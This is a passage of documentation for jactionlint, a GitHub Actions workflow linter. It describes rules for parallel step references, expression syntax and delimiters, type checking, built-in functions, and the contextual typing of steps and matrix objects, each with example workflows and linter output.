      - cancel: serverr
```

Output:

```
test.yaml:11:17: "serverr" is not the ID of a preceding background step. "wait" and "cancel" steps can only refer to an earlier step that has "background: true" [invalid-parallel-step]
   |
11 |       - cancel: serverr
   |                 ^~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpczssNAjEMBND7VjG3nNKA26CCJGuxwOKs/KF+FD4R4mTJz6NxF8IRti3XXo0WwNl8TEBDLA+PGuKR9zLsReZ82PsKyJByZ8LJizqM9cH6IeCy0v9KQwjcto5kI5Km1NJuZ+0hK8E1eBb8RMYPlqa0Io33b4c+BwCanjvx)

Steps can run in parallel. A step with `background: true` starts, and the job goes on with the next step without waiting for it. `wait: <id>` (or a list of IDs) pauses the job until the named background steps are done, `wait-all:` until all of them are done, and `cancel: <id>` stops one background step. `parallel:` holds a list of steps that run at the same time.

**What is reported.**

- A `wait` or `cancel` step that names an ID which is not the ID of an earlier step with `background: true`, such as the typo `serverr` in the example, a step that comes later or a step that is not a background step.
- A `wait`, `wait-all`, `cancel` or `parallel` step inside a `parallel` group. Only `run` and `uses` steps are allowed there.

**What is not reported.** An ID that contains an expression is not resolved. A `background:` that is an expression counts as a background step. A `background: true` inside a `parallel` group is redundant and accepted.

**Related.** A key that GitHub refuses on these steps, such as `if:` on a `cancel` step, is reported as `workflow-syntax`. [Background step results read before a wait](#check-background-step-not-waited) reports a read of the outputs of a background step before it is waited for.

<a id="check-background-step-not-waited"></a>
## Background step results read before a wait

The rule `background-step-not-waited` reports a read of `steps.<id>.outputs.*`, `steps.<id>.outcome` or `steps.<id>.conclusion` of a background step before a `wait` or `wait-all` step covers it. Such an expression evaluates to an empty string.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - id: server
        run: echo 'x=1' >> "$GITHUB_OUTPUT"
        background: true
      - run: echo "${{ steps.server.outputs.x }}"
      - wait: server
      - run: echo "${{ steps.server.outputs.x }}"
```

Output:
```
test.yaml:9:24: outputs and results of the background step "server" are not available until a "wait" or "wait-all" step covers it, so this evaluates to an empty string [background-step-not-waited]
  |
9 |       - run: echo "${{ steps.server.outputs.x }}"
  |                        ^~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Fix.** Move the step that reads the value after the `wait` step that names the background step, or add a `wait-all:` step before it.

**What is not reported.** A step whose `background:` is an expression is not tracked, because jactionlint cannot tell whether it runs in the background. Only the expressions of the later steps of the same job are looked at.

**Related.** [Parallel steps](#check-parallel-step-refs) reports a `wait` or `cancel` step that names the wrong step.

<a id="check-syntax-expression"></a>
## Syntax check for expression `${{ }}`

The rule `expression-syntax` reports a `${{ }}` expression that does not parse: an invalid character, an operator that GitHub Actions does not have, a missing parenthesis or an expression that ends too early. The rule is in the `correctness` profile.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # " is not available for string literal delimiter
      - run: echo '${{ "hello" }}'
      # + operator does not exist
      - run: echo '${{ 1 + 1 }}'
      # Missing ')' paren
      - run: echo "${{ toJson(hashFiles('**/lock', '**/cache/') }}"
      # unexpected end of input
      - run: echo '${{ github.event. }}'
```

Output:

```
test.yaml:7:24: got unexpected character '"' while lexing expression, expecting 'a'..'z', 'A'..'Z', '_', '0'..'9', ''', '}', '(', ')', '[', ']', '.', '!', '<', '>', '=', '&', '|', '*', ',', ' '. do you mean string literals? only single quotes are available for string delimiter [expression-syntax]
  |
7 |       - run: echo '${{ "hello" }}'
  |                        ^~~~~~~
test.yaml:9:26: got unexpected character '+' while lexing expression, expecting 'a'..'z', 'A'..'Z', '_', '0'..'9', ''', '}', '(', ')', '[', ']', '.', '!', '<', '>', '=', '&', '|', '*', ',', ' ' [expression-syntax]
  |
9 |       - run: echo '${{ 1 + 1 }}'
  |                          ^
test.yaml:11:65: unexpected end of input while parsing arguments of function call. expecting ",", ")" [expression-syntax]
   |
11 |       - run: echo "${{ toJson(hashFiles('**/lock', '**/cache/') }}"
   |                                                                 ^~~
test.yaml:13:38: unexpected end of input while parsing object property dereference like 'a.b' or array element dereference like 'a.*'. expecting "IDENT", "*" [expression-syntax]
   |
13 |       - run: echo '${{ github.event. }}'
   |                                      ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNp0zUGKwzAMheF9TvEwA85kJgnZ5gBd9BaJEXVaY4VK7ib47kXtOisJ/g8e5xl7kdjceZW5AZRE7QLPkqW3XtaStfRpsfZJorTLVwG9yRkUIsP/HAdcpJTYoVZ/Rib8YToBzoDyVTi3cZF42RJJ67tuTBwe/h/2hiVEGv0vanVnI7dNY1kHelHWwcbeAwDH30Qz)

jactionlint lexes and parses every expression in `${{ }}` with [the expression syntax of GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/expressions). The four findings of the example are a string delimited by double quotes (only single quotes delimit a string), the operator `+` (GitHub Actions has no arithmetic operator), a missing closing parenthesis and an expression that ends in the middle of a property access.

**Related.** [Type checks for expression syntax in `${{ }}`](#check-type-check-expression) report an expression that parses but has a wrong type. [Expressions written with the wrong delimiters](#check-malformed-expression-delimiters) reports text that is meant as an expression but is not delimited as one.

<a id="check-malformed-expression-delimiters"></a>
## Expressions written with the wrong delimiters

The rule `malformed-expression-delimiters` reports text that is meant to be an expression but is not one, because GitHub expands only `${{ }}`: a dollar sign, two braces and no space in between. The rule is in the `correctness` profile, and its rule option `pedantic` adds a second tier.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      # ERROR: one brace, GitHub does not expand it
      REF: ${ github.ref }
      # ERROR: a space after the dollar
      SHA: $ {{ github.sha }}
      # ERROR: no dollar
      TAG: v-{{ github.run_number }}
      # OK: these are not expressions
      TEMPLATE: "{{ .Values.image }}"
      HOME_BIN: ${HOME}/bin
    steps:
      - run: echo "${GITHUB_REF} {{ github.sha }}"
```

Output:

```
test.yaml:8:12: "${ github.ref }" is not an expression: GitHub expands only `${{ }}` with two braces, so this text reaches the workflow as it is. write `${{ github.ref }}` [malformed-expression-delimiters]
  |
8 |       REF: ${ github.ref }
  |            ^~~~~~~~~~~~~~~
test.yaml:10:12: "$ {{ github.sha }}" is not an expression: the opening delimiter must be written `${{` without a space. write "${{ github.sha }}" [malformed-expression-delimiters]
   |
10 |       SHA: $ {{ github.sha }}
   |            ^~~~~~~~~~~~~~~~~~
test.yaml:12:14: "{{ github.run_number }}" is not an expression: it has no `$`, and GitHub expands only `${{ }}`, so this text reaches the workflow as it is. write "${{ github.run_number }}" [malformed-expression-delimiters]
   |
12 |       TAG: v-{{ github.run_number }}
   |              ^~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpkz7FqwzAQxvHdT/FhvNrdtTmgxIGmLanb1VjlGrkkctDpsgi9e1Eat4VMEvz+w3ezUzgL26L4mg2rAgjEIb+AF8d1DsSIC1Ifx2xXInf5aYC9XitUEYcpWDGNp0+kG712rUKF+ItsR6RF+3ajcKn/1IsbnJwM+X+R3r08tr1WKGNE8z4ehbiZTuOBkFJ5q7rnnR5W26c8JP/Tg5nc1TjQmZepdT5JgT7sjLKKm23fva2GvV6nu43l9wDlrVHO)

**What is reported.** The text `${ github.ref }`, `$ {{ github.sha }}` and `{{ github.sha }}` is passed on as it is: the environment variable, the input of the action or the condition then holds the text of the typo, and nothing says so. The rule reports such text when the text inside starts with the name of a context (`github`, `env`, `vars`, `secrets`, `matrix`, `needs`, `steps`, `job`, `jobs`, `runner`, `inputs`, `strategy`) followed by a property, or with a function of expressions (`format(`, `contains(`, `fromJSON(`, ...).

The rule looks at the keys that take an expression:

- the workflow: `name`, `run-name`, `env` and `concurrency`
- a job: `name`, `if`, `runs-on`, `environment`, `concurrency`, `outputs`, `env`, `container`, `services` and `strategy`, and the `with:` and `secrets:` of a job that calls a reusable workflow
- a step: `name`, `if`, `env`, the `with:` inputs of an action and the `working-directory` of a `run:` step

**What is not reported.** The templates of Go, Jinja and Helm (`{{ .Values.image }}`), shell variables (`${HOME}`) and text in a `run:` script are never reported. Neither are the inputs that hold code (`script`, `command`, `args`, ...), where `${...}` has a meaning of its own in JavaScript.

**Fix.** `--fix` writes the intended expression (`${{ github.ref }}`) when the text is written so that the edit is exact and the text in the braces is a valid expression, and says why otherwise.

**Configure.** With the rule option `pedantic` (on under `profile: pedantic`, or `rules: {malformed-expression-delimiters: {pedantic: true}}`) the rule also reports a shell variable (`$HOME`, `${GITHUB_WORKSPACE}`) in the value of an input of an action, which no shell expands. It suggests the expression that has the value: `${{ github.workspace }}`, `${{ runner.temp }}`, or `${{ env.NAME }}` for a variable that the workflow sets. This tier looks only at one-line values of `with:` with an upper case name, and not at inputs that hold code. Some actions expand variables of their own (`${pull_title}` placeholders and the like), so the findings of this tier can be wrong for them, which is why it is pedantic. A stray `}}` is not reported.

<a id="check-type-check-expression"></a>
## Type checks for expression syntax in `${{ }}`

The rules `expression-type` and `undefined-property` (both in the `correctness` profile) report an expression in `${{ }}` whose types do not fit: an index of the wrong type, a property read from a value that is not an object, a property that an object does not have, or an object, an array or null that is evaluated into text. jactionlint checks the types of every expression, and more strictly than GitHub Actions does at run time:

- Where a string is expected, only a string, a number or `any` is accepted.
- Where a number is expected, only a number or `any` is accepted.
- An object, an array and null cannot be evaluated at `${{ }}`.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: `env` is object. Index access object is invalid
      - run: echo '${{ env[0] }}'
      # ERROR: Properties in objects are strongly typed. Missing property can be caught
      - run: echo '${{ job.container.os }}'
      # ERROR: `github.repository` is string. Trying to access .owner property is invalid
      - run: echo '${{ github.repository.owner }}'
      # ERROR: Objects, arrays and null should not be evaluated at ${{ }} since the outputs are useless
      - run: echo '${{ env }}'
```

Output:

```
test.yaml:7:28: property access of object must be type of string but got "number" [expression-type]
  |
7 |       - run: echo '${{ env[0] }}'
  |                            ^~
test.yaml:9:24: property "os" is not defined in object type {id: string; network: string} [undefined-property]
  |
9 |       - run: echo '${{ job.container.os }}'
  |                        ^~~~~~~~~~~~~~~~
test.yaml:11:24: receiver of object dereference "owner" must be type of object but got "string" [expression-type]
   |
11 |       - run: echo '${{ github.repository.owner }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~
test.yaml:13:20: object, array, and null values should not be evaluated in template with ${{ }} but evaluating the value of type {string => string} [expression-type]
   |
13 |       - run: echo '${{ env }}'
   |                    ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8yzEKwzAMheE9p3hDIVNMZ1+ldIiDqB2KZCwppYTcvbidm+kN//eEI6prHlZJGgfASK0v0Jx16t2Ts/n0nHv7JjWq+lPA1GUELVkwXvYdxNvtesdxjP/EKikswjYXphZEz+yjWPYUGlXRYtLeQV5M7exCvPX8GQCnCkLw)

**What is reported.** The four findings of the example: `env[0]` indexes an object with a number (`expression-type`), `job.container.os` reads a property that the type of `job.container` does not have (`undefined-property`), `github.repository.owner` reads a property of a string (`expression-type`), and `${{ env }}` evaluates an object (`expression-type`).

GitHub Actions replaces an object with the string `'Object'`, an array with the string `'Array'` and null with the empty string, so `echo '${{ env }}'` becomes `echo 'Object'`. Such a conversion is a bug in almost every case, and jactionlint reports it. To print the content of an object or an array, use `toJSON()`:

```
echo '${{ toJSON(github.event) }}'
```

#### Types known to the expression type checker

The type checker distinguishes the following types.

| Type          | Description                                                                          | Notation                 |
|---------------|--------------------------------------------------------------------------------------|--------------------------|
| Any           | Any value, like `any` in TypeScript. The fallback when a value cannot be typed       | `any`                    |
| Number        | Number value (integer or float)                                                      | `number`                 |
| Bool          | Boolean value                                                                        | `bool`                   |
| String        | String value                                                                         | `string`                 |
| Null          | Type of the `null` value                                                             | `null`                   |
| Array         | Array of elements of one type                                                        | `array<T>`               |
| Loose object  | Object that can contain any properties                                               | `object`                 |
| Strict object | Object whose properties are strictly typed (sorted by name in messages)               | `{prop1: T1; prop2: T2}` |
| Map object    | Object whose values all have one type, like the `env` context                         | `{string => T}`          |

An object is strict or not. Reading a property that a strict object does not have is reported. A loose object or a map allows any property name, and the property is typed `any` for a loose object and `T` for a map `{string => T}`. When the type cannot be decided statically, the type is `any`: for example the result of `fromJSON()` when its argument is not a string literal.

#### Expanding an object or array with one expression

A whole object or array can be expanded by one `${{ }}`. In the example, the object `matrix.env_object` is expanded at `env:`, and jactionlint checks the type of the expanded value: a string cannot be expanded as an object.

Example input:

```yaml
on: push
jobs:
  test:
    strategy:
      matrix:
        env_string:
          - 'FOO=BAR'
          - 'FOO=PIYO'
        env_object:
          - FOO: BAR
          - FOO: PIYO
    runs-on: ubuntu-latest
    steps:
      # OK: Expanding object at 'env:' section
      - run: echo "$FOO"
        env: ${{ matrix.env_object }}
      # ERROR: String value cannot be expanded as object
      - run: echo "$FOO"
        env: ${{ matrix.env_string }}
```

Output:

```
test.yaml:19:14: type of expression at "env" must be object but found type string [expression-type]
   |
19 |         env: ${{ matrix.env_string }}
   |              ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNqckD8LgzAUxHc/xSGCU/oBAh10EDqluHUqKsE/tIkkL6VF8t1LULHi1inckbv3e08rjtHZLhp0bXkEkLQUXsCSqUi2n1kBz4pM/14VINXrbsn0qt08gCEthDjnWZke3evlJtJdga4H2dC+oBCCI8/KoxnyEQAYpywL7K52ihx7VIF7wZajXQtZ+Mkhm04jTgoh4t/pHMk0LXudNhp4/198vga8/w4AgQRZVA==)

**Related.** [Expressions for a whole mapping or list](#check-whole-value-expressions) lists the keys that accept such an expression.

<a id="check-comparison-types"></a>
## Strict type checks for comparison operators

The rule `expression-type` also reports a comparison that cannot have a meaningful result: an object or an array compared with a value of another type, or a boolean, null, object or array compared with `>`, `>=`, `<` or `<=`. The rule is in the `correctness` profile.

Example input:

```yaml
on:
  workflow_call:
    inputs:
      timeout:
        type: boolean

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'called!'
        # ERROR: Comparing string to object is always evaluated to false
        if: ${{ github.event == 'workflow_call' }}
      - run: echo 'timeout is too long'
        # ERROR: Comparing boolean value with `>` doesn't make sense
        if: ${{ inputs.timeout > 60 }}
```

Output:

```
test.yaml:13:17: "object" value cannot be compared to "string" value with "==" operator [expression-type]
   |
13 |         if: ${{ github.event == 'workflow_call' }}
   |                 ^~~~~~~~~~~~
test.yaml:16:17: "bool" value cannot be compared to "number" value with ">" operator [expression-type]
   |
16 |         if: ${{ inputs.timeout > 60 }}
   |                 ^~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpsj81KwDAQhO99ihGEnFo8eQjUV5Gmbtto3C3NxiIl7y7pH4jednc+ZmaFbQWssnwMQdbXvguhHADPc9J4zID6T5Kk1wro90wWTiRQx1X1Lm5nleIJLYljLWyRXGJNdeiKtktRab6d60JaUD8JTImntwdzx/jB4nHbMHqdkmvoi1jRtjC/Ghvk/J/d2Ro+QkUQhMe/1sejzcW+4PkJOf8MAEdGU1w=)

GitHub Actions supports the operators `==`, `!=`, `>`, `>=`, `<` and `<=` for operands of any type. When the types differ, the operands are implicitly converted to numbers before the comparison (see [the operators of GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/expressions#operators)). Some comparisons are meaningless, and jactionlint reports them:

- Objects and arrays are converted to `NaN`, so comparing an object or an array with a value of another type is always false.
- Comparing booleans, null, objects and arrays with `>`, `>=`, `<` or `<=` makes no sense.

**What is not reported.** GitHub Actions has some more surprising behaviors, which jactionlint accepts to avoid false findings:

- `0 == null`, `'0' == null` and `false == null` are true, because both sides are converted to `0`.
- `'0' == false` and `0 == false` are true for the same reason.
- Objects and arrays are equal only when they are the same instance.

<a id="check-contexts-and-builtin-func"></a>
## Contexts and built-in functions

The rules `undefined-property`, `undefined-function` and `invalid-function-call` (all in the `correctness` profile) report a context or property that does not exist, a function that does not exist, and a call of a built-in function with the wrong number or types of arguments.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # Access undefined context
      - run: echo '${{ unknown_context }}'
      # Access undefined property of context
      - run: echo '${{ github.events }}'
      # Calling undefined function (start's'With is correct)
      - run: echo "${{ startWith('hello, world', 'lo,') }}"
      # Wrong number of arguments
      - run: echo "${{ startsWith('hello, world') }}"
      # Wrong type of parameter
      - run: echo "${{ startsWith('hello, world', github.event) }}"
      # Function overloads can be handled properly. contains() has string version and array version
      - run: echo "${{ contains('hello, world', 'lo,') }}"
      - run: echo "${{ contains(github.event.issue.labels.*.name, 'enhancement') }}"
```

Output:

```
test.yaml:7:24: undefined variable "unknown_context". available variables are "env", "github", "inputs", "job", "matrix", "needs", "runner", "secrets", "steps", "strategy", "vars" [undefined-property]
  |
7 |       - run: echo '${{ unknown_context }}'
  |                        ^~~~~~~~~~~~~~~
test.yaml:9:24: property "events" is not defined in object type {action: string; action_path: string; action_ref: string; action_repository: string; action_status: string; actor: string; actor_id: string; api_url: string; artifact_cache_size_limit: number; artifacts: string; artifacts_list: string; base_ref: string; env: string; event: object; event_name: string; event_path: string; graphql_url: string; head_ref: string; job: string; job_workflow_sha: string; output: string; path: string; ref: string; ref_name: string; ref_protected: bool; ref_type: string; repository: string; repository_id: string; repository_owner: string; repository_owner_id: string; repository_visibility: string; repositoryurl: string; retention_days: number; run_attempt: string; run_id: string; run_number: string; secret_source: string; server_url: string; sha: string; state: string; step_summary: string; token: string; triggering_actor: string; workflow: string; workflow_ref: string; workflow_sha: string; workspace: string} [undefined-property]
  |
9 |       - run: echo '${{ github.events }}'
  |                        ^~~~~~~~~~~~~
test.yaml:11:24: undefined function "startWith". available functions are "always", "cancelled", "case", "contains", "endswith", "failure", "format", "fromjson", "hashfiles", "join", "startswith", "success", "tojson" [undefined-function]
   |
11 |       - run: echo "${{ startWith('hello, world', 'lo,') }}"
   |                        ^~~~~~~~~~~~~~~~~
test.yaml:13:24: number of arguments is wrong. function "startsWith(string, string) -> bool" takes 2 parameters but 1 arguments are given [invalid-function-call]
   |
13 |       - run: echo "${{ startsWith('hello, world') }}"
   |                        ^~~~~~~~~~~~~~~~~~
test.yaml:15:51: 2nd argument of function call is not assignable. "object" cannot be assigned to "string". called function type is "startsWith(string, string) -> bool" [invalid-function-call]
   |
15 |       - run: echo "${{ startsWith('hello, world', github.event) }}"
   |                                                   ^~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqckMFKxDAQhu/7FMMiRCXNA/RFPEpSBxPNziydGVcoeXeJBVGwPfSUw/99f36GaYSrST69cZLxBKAo2l+A2UiGnlsyUhtq7Nl3JIpXWSmAoZMj4JQZ3N2ygNE78Y2eJybFT4XW3Bb6WjRbCviBpLIBnjsoGmd9KprvXcZa2cON5/riPLjK3j1Aa+ddV/6Rj1n+z+rdjn6BWEgOjP5Rf38WiohhqDFhlfAYKF7Qg0PKkSa8IOla+jUA1HySLw==)

[Contexts](https://docs.github.com/en/actions/learn-github-actions/contexts) and [built-in functions](https://docs.github.com/en/actions/learn-github-actions/expressions#functions) are strongly typed, so a typo in a property access, a typo in a function name and an invalid call are all reported. jactionlint handles functions that

- are overloaded (for example `contains(str, substr)` and `contains(array, item)`)
- have optional parameters (for example `join(strings, sep)` and `join(strings)`)
- have repeatable parameters (for example `hashFiles(file1, file2, ...)`)

Context names and function names are case-insensitive: `toJSON` and `toJson` are the same function.

**Functions with a check of their own.** jactionlint checks some built-in functions further:

- `format()`: the placeholders in the format string against the number of arguments, when the first argument is a string literal.
- `fromJSON()`: the JSON string is valid, and the return value is typed from it, when the argument is a string literal.
- `case()`: the number of arguments is odd (pairs of a predicate and a value, then a default).

Example input:

```yaml
on: push

jobs:
  test:
    # ERROR: Key 'mac' does not exist in the object returned by the fromJSON()
    runs-on: ${{ fromJSON('{"win":"windows-latest","linux":"ubuntul-latest"}')['mac'] }}
    steps:
      # ERROR: {2} is missing in the first argument of format()
      - run: echo "${{ format('{0}{1}', 1, 2, 3) }}"
      # ERROR: Argument for {2} is missing in the arguments of format()
      - run: echo "${{ format('{0}{1}{2}', 1, 2) }}"
      - run: echo This is a special branch!
        # ERROR: Broken JSON string. Special check for fromJSON()
        if: contains(fromJson('["main","release","dev"'), github.ref_name)
```

Output:

```
test.yaml:6:18: property "mac" is not defined in object type {linux: string; win: string} [undefined-property]
  |
6 |     runs-on: ${{ fromJSON('{"win":"windows-latest","linux":"ubuntul-latest"}')['mac'] }}
  |                  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:24: format string "{0}{1}" does not contain placeholder {2}. remove argument which is unused in the format string [invalid-function-call]
  |
9 |       - run: echo "${{ format('{0}{1}', 1, 2, 3) }}"
  |                        ^~~~~~~~~~~~~~~~
test.yaml:11:24: format string "{0}{1}{2}" contains placeholder {2} but only 2 arguments are given to format [invalid-function-call]
   |
11 |       - run: echo "${{ format('{0}{1}{2}', 1, 2) }}"
   |                        ^~~~~~~~~~~~~~~~~~~
test.yaml:14:31: broken JSON string is passed to fromJSON() at offset 23: unexpected end of JSON input [invalid-function-call]
   |
14 |         if: contains(fromJson('["main","release","dev"'), github.ref_name)
   |                               ^~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqMj0FL9DAQhu/7K95v+CAtZMVdb/kJHvSgt0Uk7aY20k5KJnGFkP8ure5R8DJzmPeZhzewwZJl3O3eQydmByQnad1AzCz7NfC/FAwxzPdPjw+NKnTxTGad53CR/WRXhDRNnvMnGcpd5pSn66Gq9qRm26sX1Lo9luQW+XYA+9Vj4PoxgDZTiLNNjSq3tRyq0jhoHDXuWtRKf4PK8cr9Bj2PXuAFFrK43tsJXbTcj/9+soAfDPrAyXqWZmsvgRt1otl6Jk3RTc6KI01n90Gq1XjzaczdTXTDK9vZtV8DAMITaRA=)

GitHub Actions has no syntax for an array or object constant, so workflows create one with `fromJSON()`. Because jactionlint types the result, the example reports the key `mac` that the constant does not have.

<a id="check-contextual-step-object"></a>
## Contextual typing for `steps.<step_id>` objects

The rule `undefined-property` (`correctness` profile) reports a read of `steps.<step_id>` that the job cannot satisfy: a step that has not run yet, a step of another job, or an output that the step does not set.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      # Step outputs can be used in job outputs since this section is evaluated after all steps were run
      foo: '${{ steps.get_value.outputs.name }}'
    steps:
      # ERROR: Access undefined step outputs
      - run: echo '${{ steps.get_value.outputs.name }}'
      # Outputs are set here
      - run: echo "foo=value" >> "$GITHUB_OUTPUT"
        id: get_value
      # OK
      - run: echo '${{ steps.get_value.outputs.name }}'
      # OK
      - run: echo '${{ steps.get_value.conclusion }}'
  other:
    runs-on: ubuntu-latest
    steps:
      # ERROR: Access undefined step outputs. Step objects are job-local
      - run: echo '${{ steps.get_value.outputs.name }}'
```

Output:

```
test.yaml:7:7: output "foo" of job "test" is never used: no other job reads "needs.test.outputs.foo". remove it [unused-job-output]
  |
7 |       foo: '${{ steps.get_value.outputs.name }}'
  |       ^~~~
test.yaml:10:24: property "get_value" is not defined in object type {} [undefined-property]
   |
10 |       - run: echo '${{ steps.get_value.outputs.name }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:22:24: property "get_value" is not defined in object type {} [undefined-property]
   |
22 |       - run: echo '${{ steps.get_value.outputs.name }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqskDFrhEAQhXt/xWMRrPQHLMQiTZIqKbQWNWs0mB1xZtKI/z3sxgQODo7jrprifd88eOQtFuUx+aSObQKIYwkXWNVzHnLt1IvmcxuyGJHKosK/HDAQWWTptoHFLVx8OGm+21ldcYCFb78c9j2LQoT+3Dz0WLh+pCtenHpmIHqItEFZwqRPL9Vz/di81tVbXZnDAKZ3i//Hd+w/6/Xk+1l5In9YJKNbL0572zg/AwAkVZJl)

The outputs of a step are read through `steps.<step_id>` objects. The `steps` context is dynamic:

- Reading the outputs of a step before it runs gives `null`, so jactionlint reports the read.
- Only the steps of the same job are accessible. Step objects are job-local, and the outputs of a job are read from other jobs through `needs`.

Reading the outputs of the wrong step is a common mistake when steps are copied and their placeholders are not updated. jactionlint reports these reads.

The first finding of the example, `unused-job-output`, is not about `steps`: no other job reads `needs.test.outputs.foo`. See [Unused job outputs](#check-unused-job-output).

**Popular actions.** When a popular action sets the outputs, the `outputs` object is typed strictly.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: The step is not run yet at this point
      - run: echo ${{ steps.cache.outputs.cache-hit }}
      # actions/cache sets cache-hit output
      - uses: actions/cache@v4
        id: cache
        with:
          key: ${{ hashFiles('**/*.lock') }}
          path: ./packages
      # OK
      - run: echo ${{ steps.cache.outputs.cache-hit }}
      # ERROR: Typo at output name
      - run: echo ${{ steps.cache.outputs.cache_hit }}
```

Output:

```
test.yaml:8:23: property "cache" is not defined in object type {} [undefined-property]
  |
8 |       - run: echo ${{ steps.cache.outputs.cache-hit }}
  |                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:18:23: property "cache_hit" is not defined in object type {cache-hit: string} [undefined-property]
   |
18 |       - run: echo ${{ steps.cache.outputs.cache_hit }}
   |                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqkjsFKxDAQhu99iv8grBbaXjzNyZOvIdk4OLElCc6MIsu+uyRd6lUwlzDzfT//lEyorjIM7+WsNADGau0HPjzr1AQ/ezafttBYR2pcdbeAqZkEjlJwd7nscI4hCs/FrbrdpkmS4Xo9Yq6shBAtlaxLV54+H28YSK+Evjw2X8mEjglY+Zt6pQSV57Sx3p/GcRnnrcT19PDb1V4NJoR5qSGu4Y31v9f/Mfayx34GAIltbNw=)

The `actions/cache` action sets the output `cache-hit`, which later steps read to know whether the cache was hit. In the first read of the example the cache step has not run, so `steps.cache` does not exist yet. After the step with the ID `cache` has run, `steps.cache` is typed `{conclusion: string; outcome: string; outputs: {cache-hit: string}}`. In the last read the output name has a typo, which jactionlint reports because the properties of `steps.cache.outputs` are typed. For an action that is not popular, `--online` reads its outputs from GitHub: see [Inputs and outputs of any action (online)](#check-remote-action-metadata).

**Local actions.** The same strict typing applies to a local action. The example defines the action `.github/actions/my-action-with-output/action.yaml`, which declares one output.

Example input:

```yaml
# select: undefined-property,local-action-checkout
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: The step is not yet run
      - run: echo ${{ steps.my_action.outputs.some_value }}
      # The action runs here and sets its outputs
      - uses: ./.github/actions/my-action-with-output
        id: my_action
      # OK
      - run: echo ${{ steps.my_action.outputs.some_value }}
      # ERROR: No output named 'some-value' (typo)
      - run: echo ${{ steps.my_action.outputs.some-value }}
```

Example file: .github/actions/my-action-with-output/action.yaml

```yaml
name: 'My action with output'
author: 'octocat'
description: 'my action with outputs'

outputs:
  some_value:
    description: some value returned from this action

runs:
  using: 'node20'
  main: 'index.js'
```

Output:

```
test.yaml:9:23: property "my_action" is not defined in object type {} [undefined-property]
  |
9 |       - run: echo ${{ steps.my_action.outputs.some_value }}
  |                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:11:15: local action "./.github/actions/my-action-with-output" is used before any checkout step in this job. the repository is not on the runner yet so the action cannot be found. add "actions/checkout" before this step or use "$/" syntax. this is reported because the "local-action-checkout" rule is enabled [local-action-checkout]
   |
11 |       - uses: ./.github/actions/my-action-with-output
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:16:23: property "some-value" is not defined in object type {some_value: string} [undefined-property]
   |
16 |       - run: echo ${{ steps.my_action.outputs.some-value }}
   |                       ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The action `My action with output` declares the output `some_value`, so `steps.my_action.outputs` is typed `{some_value: string}`, and the typo `some-value` is reported. The second finding is `local-action-checkout`: the `./` form needs the repository on the runner, so add an `actions/checkout` step before the action or write the action as `$/.github/actions/my-action-with-output`. See [Local action used before checkout](#check-local-action-checkout).

<a id="check-contextual-matrix-object"></a>
## Contextual typing for `matrix` object

The rule `undefined-property` (`correctness` profile) reports a read of `matrix.<name>` that the `strategy.matrix` of the job does not define, and a property that the objects of a matrix value do not have.

Example input:

```yaml
on: push
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [14, 15]
        package:
          - name: 'foo'
            optional: true
          - name: 'bar'
            optional: false
        include:
          - node: 15
            npm: 7.5.4
    runs-on: ${{ matrix.os }}
    steps:
      # Access undefined matrix value
      - run: echo '${{ matrix.platform }}'
      # Matrix value is strongly typed. Below line causes an error since matrix.package is {name: string, optional: bool}
      - run: echo '${{ matrix.package.dev }}'
      # OK
      - run: |
          echo 'os: ${{ matrix.os }}'
          echo 'node version: ${{ matrix.node }}'
          echo 'package: ${{ matrix.package.name }} (optional=${{ matrix.package.optional }})'
      # Additional matrix values in 'include:' are supported
      - run: echo 'npm version is specified'
        if: ${{ contains(matrix.npm, '7.5') }}
  test2:
    runs-on: ubuntu-latest
    steps:
      # Matrix values in other job is not accessible
      - run: echo '${{ matrix.os }}'
```

Output:

```
test.yaml:19:24: property "platform" is not defined in object type {node: number; npm: string; os: string; package: {name: string; optional: bool}} [undefined-property]
   |
19 |       - run: echo '${{ matrix.platform }}'
   |                        ^~~~~~~~~~~~~~~
test.yaml:21:24: property "dev" is not defined in object type {name: string; optional: bool} [undefined-property]
   |
21 |       - run: echo '${{ matrix.package.dev }}'
   |                        ^~~~~~~~~~~~~~~~~~
test.yaml:34:24: property "os" is not defined in object type {} [undefined-property]
   |
34 |       - run: echo '${{ matrix.os }}'
